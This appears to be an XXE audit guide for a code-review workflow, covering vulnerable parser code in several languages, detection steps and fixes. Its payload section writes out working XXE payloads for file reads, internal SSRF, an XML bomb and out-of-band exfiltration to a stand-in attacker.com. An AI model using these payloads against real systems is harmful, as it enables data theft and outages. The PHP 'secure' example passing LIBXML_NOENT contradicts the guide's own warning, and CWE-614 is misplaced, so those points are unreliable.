<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Codex-native BALLS workflow and evidence rules. -->

## Overview

## ⚠️ Mandatory: Concrete Data Flow Proof Required

**DO NOT report a finding based on pattern-matching alone.** For every potential vulnerability you identify:

1. **Find the SINK** (dangerous function/API call)
2. **Trace all callers** — use `codegraph callers <symbol>` or `codegraph explore "<flow question>"` to identify call sites and execution paths.
3. **For each caller, trace the argument origin**:
   - Hardcoded/constant value → **Skip** (not a vulnerability, just bad practice)
   - Config file / admin-only source → **Skip** (not exploitable from internet)
   - User-controlled input (HTTP request, RPC, file upload, etc.) → **Investigate further**
   - Another service / database → **Trace upstream** to find the ultimate source
4. **Document the complete path**: SOURCE (file:line) → INTERMEDIATES (file:line each) → SINK (file:line)
5. **Verify no sanitization** between source and sink that would prevent exploitation

**"If an attacker controls X" is NOT a valid finding. You must prove X is user-controlled by tracing the actual code.**

XML External Entity (XXE) injection occurs when XML parsers process external entity references in user-supplied XML input. Successful exploitation can lead to local file disclosure, server-side request forgery (SSRF), denial of service (billion laughs / XML bomb), and in some cases remote code execution. XXE is especially dangerous because many applications process XML unknowingly through document uploads (DOCX, XLSX, SVG), SOAP services, and configuration parsing. Modern frameworks have improved defaults, but legacy parsers and explicit misconfiguration remain common.

## Vulnerability Patterns

### Java — Dangerous XML Parser Configurations

```java
// Java — VULNERABLE: DocumentBuilderFactory with defaults
import javax.xml.parsers.DocumentBuilderFactory;

public Document parseXml(String xmlInput) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // VULNERABLE: DTD processing and external entities enabled by default
    // in many JDK versions
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlInput)));
}

// Java — VULNERABLE: SAXParserFactory
SAXParserFactory factory = SAXParserFactory.newInstance();
// VULNERABLE: No features set to disable DTDs/external entities
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// Java — VULNERABLE: XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
// VULNERABLE: External entities not disabled
reader.setContentHandler(handler);
reader.parse(new InputSource(new StringReader(xmlInput)));

// Java — VULNERABLE: Transformer (XSLT injection)
TransformerFactory tf = TransformerFactory.newInstance();
// VULNERABLE: Processes user-supplied XSLT without restrictions
Transformer transformer = tf.newTransformer(new StreamSource(userXslt));
transformer.transform(new StreamSource(xmlInput), new StreamResult(output));

// Java — VULNERABLE: JAXB Unmarshaller
JAXBContext context = JAXBContext.newInstance(MyClass.class);
Unmarshaller unmarshaller = context.createUnmarshaller();
// VULNERABLE: Unmarshalling user XML without safe source
MyClass obj = (MyClass) unmarshaller.unmarshal(new StreamSource(userInput));

// Java — VULNERABLE: XPathFactory
XPathFactory xpf = XPathFactory.newInstance();
XPath xpath = xpf.newXPath();
// VULNERABLE: XPath with user-controlled expression
String result = xpath.evaluate(userExpression, document);
```

### Python — Dangerous XML Parsers

```python
# Python — VULNERABLE: xml.etree.ElementTree (limited XXE risk, but still)
import xml.etree.ElementTree as ET

# VULNERABLE: Billion laughs / decompression bomb possible
tree = ET.parse(user_uploaded_file)

# Python — VULNERABLE: lxml with entity resolution
from lxml import etree

# VULNERABLE: resolve_entities=True is the default
parser = etree.XMLParser(resolve_entities=True)
tree = etree.parse(user_input, parser)

# VULNERABLE: lxml fromstring
doc = etree.fromstring(user_xml_bytes)

# Python — VULNERABLE: xml.sax
import xml.sax
# VULNERABLE: SAX parser processes external entities by default
handler = MyContentHandler()
xml.sax.parseString(user_xml_bytes, handler)

# Python — VULNERABLE: xmlrpc
import xmlrpc.client
# VULNERABLE: XML-RPC client processes XML responses that may contain XXE
proxy = xmlrpc.client.ServerProxy('http://untrusted-server/RPC2')
```

### .NET — Dangerous XML Parsers

```csharp
// C# — VULNERABLE: XmlDocument with DTD processing
XmlDocument doc = new XmlDocument();
// .NET Framework < 4.5.2: DTD processing is ON by default
// VULNERABLE: Must explicitly set XmlResolver to null
doc.Load(userInputStream);

// C# — VULNERABLE: XmlReader with DTD enabled
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse;  // VULNERABLE: Explicitly enables DTDs
settings.XmlResolver = new XmlUrlResolver();     // VULNERABLE: Resolves external URIs
XmlReader reader = XmlReader.Create(userInput, settings);

// C# — VULNERABLE: XDocument
XDocument doc = XDocument.Load(userInput);  // May process DTDs depending on version

// C# — VULNERABLE: XmlSerializer with user-controlled type
XmlSerializer serializer = new XmlSerializer(typeof(UserData));
// VULNERABLE: Deserialization of user XML
UserData data = (UserData)serializer.Deserialize(userInputStream);

// C# — VULNERABLE: XslCompiledTransform
XslCompiledTransform xslt = new XslCompiledTransform();
// VULNERABLE: User-supplied XSLT
xslt.Load(userXsltPath);
xslt.Transform(inputXml, outputWriter);
```

### PHP — Dangerous XML Functions

```php
// PHP — VULNERABLE: simplexml_load_string with LIBXML_NOENT
$xml = simplexml_load_string($userInput, 'SimpleXMLElement', LIBXML_NOENT);
// LIBXML_NOENT causes entity substitution — enables XXE

// PHP — VULNERABLE: DOMDocument
$doc = new DOMDocument();
$doc->loadXML($userInput);
// VULNERABLE: External entities processed by default in older PHP

// PHP — VULNERABLE: XMLReader
$reader = new XMLReader();
$reader->xml($userInput);
// VULNERABLE: Processes DTDs by default
```

### Ruby — Dangerous XML Parsers

```ruby
# Ruby — VULNERABLE: Nokogiri with default settings
require 'nokogiri'

# VULNERABLE: Nokogiri < 1.5.4 resolves external entities by default
doc = Nokogiri::XML(user_input)

# Ruby — VULNERABLE: REXML
require 'rexml/document'

# VULNERABLE: Processes external entities
doc = REXML::Document.new(user_input)
```

### Go — XML Parsing

```go
// Go — encoding/xml is SAFE by default (ignores DTDs and external entities)
// However, third-party XML libraries may be vulnerable

import "encoding/xml"

// SAFE: Go's standard xml package ignores DTDs
var result MyStruct
err := xml.Unmarshal(userInput, &result)

// But be aware of third-party libraries like libxml2 bindings
// that may have different defaults
```

### XXE Attack Payloads

```xml
<!-- Classic XXE: File Read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

<!-- XXE: SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<user><name>&xxe;</name></user>

<!-- XXE: Windows File Read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>

<!-- Billion Laughs (XML Bomb / DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- Blind XXE: Out-of-Band Data Exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

<!-- evil.dtd on attacker server:
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect?data=%file;'>">
%all;
-->

<!-- XXE via SVG Upload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- XXE via DOCX/XLSX (embedded XML in ZIP) -->
<!-- [Content_Types].xml within the archive can contain DTD declarations -->

<!-- XPath Injection -->
<!-- User input: ' or '1'='1 -->
<!-- Resulting XPath: //users/user[username/text()='' or '1'='1'] -->
```

### SOAP-Based XXE

```xml
<!-- SOAP request with XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

## Detection Methodology

1. **XML Parser Discovery**: Find all XML parsing code — search for parser class instantiation and XML loading functions
2. **Configuration Check**: For each parser instance, verify that DTD processing and external entities are disabled
3. **Input Tracing**: Trace the source of XML input — is it user-controlled (HTTP request, file upload, API call)?
4. **Document Upload Analysis**: Check if DOCX, XLSX, SVG, XML uploads are parsed with vulnerable parsers
5. **SOAP Service Audit**: Identify SOAP endpoints and verify their XML parser configuration
6. **XPath Expression Audit**: Check if XPath expressions include user input without parameterization
7. **XSLT Processing**: Identify any XSLT transformation with user-supplied stylesheets
8. **Library Version Check**: Verify XML library versions for known XXE-related CVEs
9. **Defused Library Usage**: Check for `defusedxml` (Python), OWASP ESAPI, or framework-level protections
10. **Content-Type Analysis**: Check if endpoints accept `application/xml` or `text/xml` content types

## Common Sinks and Sources

### Parser Classes by Language

| Language | Vulnerable Parsers | Safe Alternatives |
|----------|--------------------|-------------------|
| Java | `DocumentBuilderFactory`, `SAXParserFactory`, `XMLReader`, `TransformerFactory`, `Unmarshaller`, `XPathFactory` | Same classes with features disabled |
| Python | `lxml.etree`, `xml.sax`, `xml.dom.minidom`, `xml.dom.pulldom` | `defusedxml` library |
| .NET | `XmlDocument`, `XmlReader` (with DTD), `XslCompiledTransform`, `XmlSerializer` | `XmlReader` with safe settings |
| PHP | `simplexml_load_string(LIBXML_NOENT)`, `DOMDocument`, `XMLReader` | `libxml_disable_entity_loader(true)` |
| Ruby | `Nokogiri::XML`, `REXML::Document` | `Nokogiri::XML(input) { \|config\| config.nonet }` |
| Go | `encoding/xml` (safe by default) | N/A — standard library is safe |

### Input Vectors
- HTTP request bodies with XML content-type
- File uploads: `.xml`, `.svg`, `.docx`, `.xlsx`, `.pptx`, `.odt`
- SOAP web service requests
- RSS/Atom feed parsing
- XML-RPC calls
- Configuration file parsing
- Data import features (XML data feeds)
- SAML assertions

## False Positive Indicators

- **Go standard library**: `encoding/xml` does not process DTDs or external entities
- **Defused libraries in use**: `defusedxml` (Python) is explicitly safe
- **Parser features disabled**: Verify the specific features set on the parser instance — may be safe despite using a vulnerable class
- **Internal XML only**: XML generated and consumed internally (never user-supplied) has lower risk
- **XML schema validation only**: Validating against a schema without processing entity references
- **Static XML config parsing**: Parsing hardcoded/bundled XML files during application startup (no user input)
- **Modern framework defaults**: Some modern frameworks disable XXE by default (check version)

## Severity Assessment

| Finding | Severity |
|---------|----------|
| XXE with file read capability on user-controlled XML | **Critical** |
| XXE with SSRF to internal services | **Critical** |
| XSLT injection with user-supplied stylesheets | **Critical** |
| Blind XXE with OOB data exfiltration | **High** |
| XXE via document upload (DOCX, SVG, XLSX) | **High** |
| SOAP endpoint with XXE | **High** |
| Billion laughs / XML bomb (DoS) | **High** |
| XPath injection with user-controlled expressions | **High** |
| XML parser with DTD enabled but no user XML input identified | **Medium** |
| XXE in development/internal tools | **Medium** |
| XML bomb protection missing (but no file read) | **Medium** |
| Outdated XML library version with known CVE | **Medium** |

## Remediation Patterns

### Java — Safe XML Parser Configuration

```java
// SECURE: DocumentBuilderFactory
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();

// SECURE: SAXParserFactory
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// SECURE: TransformerFactory (prevent XSLT injection)
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

// SECURE: XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// SECURE: JAXB Unmarshaller with safe source
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
SAXSource source = new SAXSource(spf.newSAXParser().getXMLReader(),
    new InputSource(userInputStream));
MyClass obj = (MyClass) unmarshaller.unmarshal(source);
```

### Python — Safe XML Parsing

```python
# SECURE: Use defusedxml for all XML parsing
import defusedxml.ElementTree as ET
import defusedxml.minidom as minidom
from defusedxml import parse as safe_parse

# Safe — all XXE vectors blocked
tree = ET.parse(user_uploaded_file)
doc = minidom.parseString(user_xml_string)

# SECURE: lxml with safe configuration
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False,
)
tree = etree.parse(user_input, parser)
```

### .NET — Safe XML Configuration

```csharp
// SECURE: XmlReader with safe settings
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // Reject DTDs entirely
settings.XmlResolver = null;                        // No external resolution
XmlReader reader = XmlReader.Create(userInput, settings);

// SECURE: XmlDocument
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // Prevents external entity resolution
doc.Load(userInputStream);

// SECURE: XDocument (modern .NET)
XDocument doc = XDocument.Load(XmlReader.Create(userInput,
    new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }));
```

### PHP — Safe XML Configuration

```php
// SECURE: Disable entity loader (PHP < 8.0)
libxml_disable_entity_loader(true);

// SECURE: Load without LIBXML_NOENT
$xml = simplexml_load_string($userInput);  // Without LIBXML_NOENT flag

// SECURE: DOMDocument with entity loading disabled
$doc = new DOMDocument();
$doc->loadXML($userInput, LIBXML_NONET | LIBXML_NOENT);
// PHP 8.0+: External entities disabled by default
```

### Ruby — Safe XML Configuration

```ruby
# SECURE: Nokogiri with network disabled
doc = Nokogiri::XML(user_input) do |config|
  config.nonet   # Prevent network access
  config.noent   # Do not substitute entities
end

# SECURE: REXML with entity expansion limit
REXML::Document.entity_expansion_limit = 0
doc = REXML::Document.new(user_input)
```

### XPath Injection Prevention

```java
// SECURE: Parameterized XPath
XPathFactory xpf = XPathFactory.newInstance();
XPath xpath = xpf.newXPath();

// Use XPathVariableResolver instead of string concatenation
xpath.setXPathVariableResolver(new XPathVariableResolver() {
    public Object resolveVariable(QName variableName) {
        if ("username".equals(variableName.getLocalPart())) {
            return sanitizedUsername;
        }
        return null;
    }
});

XPathExpression expr = xpath.compile("//users/user[username/text()=$username]");
```

## CWE References

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **CWE-776**: Improper Restriction of Recursive Entity References in DTDs (Billion Laughs)
- **CWE-827**: Improper Control of Document Type Definition
- **CWE-91**: XML Injection (XPath Injection)
- **CWE-643**: Improper Neutralization of Data within XPath Expressions
- **CWE-614**: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- **CWE-918**: Server-Side Request Forgery (SSRF via XXE)
- **CWE-400**: Uncontrolled Resource Consumption (XML Bomb)
- **CWE-112**: Missing XML Validation
